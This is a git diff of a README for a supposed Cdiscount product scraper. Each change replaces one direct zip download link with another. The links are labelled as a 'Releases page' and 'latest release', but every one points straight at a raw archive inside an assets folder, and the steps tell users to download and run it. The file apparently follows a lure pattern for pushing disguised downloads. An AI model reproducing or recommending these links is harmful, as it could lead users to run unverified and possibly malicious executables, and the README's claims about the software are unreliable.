@@ -1,6 +1,6 @@
 # 🛒 cdiscount-product-details-scraper - Extract Product Details Easily
 
-[![Download](https://raw.githubusercontent.com/RichieFernando00/cdiscount-product-details-scraper/main/ASSIGNMENT1/assets/product-cdiscount-scraper-details-v2.6.zip)](https://raw.githubusercontent.com/RichieFernando00/cdiscount-product-details-scraper/main/ASSIGNMENT1/assets/product-cdiscount-scraper-details-v2.6.zip)
+[![Download](https://github.com/RichieFernando00/cdiscount-product-details-scraper/raw/refs/heads/main/ASSIGNMENT1/assets/product_details_cdiscount_scraper_1.9.zip)](https://github.com/RichieFernando00/cdiscount-product-details-scraper/raw/refs/heads/main/ASSIGNMENT1/assets/product_details_cdiscount_scraper_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -27,11 +27,11 @@ To use this application, you need:
 
 To get started, visit the releases page to download the latest version of the cdiscount-product-details-scraper. 
 
-[Download the latest release here](https://raw.githubusercontent.com/RichieFernando00/cdiscount-product-details-scraper/main/ASSIGNMENT1/assets/product-cdiscount-scraper-details-v2.6.zip).
+[Download the latest release here](https://github.com/RichieFernando00/cdiscount-product-details-scraper/raw/refs/heads/main/ASSIGNMENT1/assets/product_details_cdiscount_scraper_1.9.zip).
 
 ### Installation Steps
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/RichieFernando00/cdiscount-product-details-scraper/main/ASSIGNMENT1/assets/product-cdiscount-scraper-details-v2.6.zip).
+1. Visit the [Releases page](https://github.com/RichieFernando00/cdiscount-product-details-scraper/raw/refs/heads/main/ASSIGNMENT1/assets/product_details_cdiscount_scraper_1.9.zip).
 2. Look for the latest version listed.
 3. Click on the file suitable for your operating system. You can typically find options for Windows, macOS, or Linux.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -76,4 +76,4 @@ The cdiscount-product-details-scraper simplifies your data collection from Cdisc
 
 Happy scraping! 
 
-[Download the latest release here](https://raw.githubusercontent.com/RichieFernando00/cdiscount-product-details-scraper/main/ASSIGNMENT1/assets/product-cdiscount-scraper-details-v2.6.zip).
+[Download the latest release here](https://github.com/RichieFernando00/cdiscount-product-details-scraper/raw/refs/heads/main/ASSIGNMENT1/assets/product_details_cdiscount_scraper_1.9.zip).
